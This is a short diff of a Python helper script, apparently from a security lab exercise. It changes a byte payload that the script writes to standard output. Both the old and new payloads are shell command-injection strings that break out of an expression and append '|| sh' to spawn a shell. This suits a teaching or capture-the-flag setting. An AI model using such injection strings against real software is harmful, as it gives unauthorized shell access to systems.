@@ -5,6 +5,6 @@ TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
 
-payload = b"x)) || sh 1>&2 #"
+payload = b"1) || sh 1>&2 || ( 1"
 
 sys.stdout.buffer.write(payload)
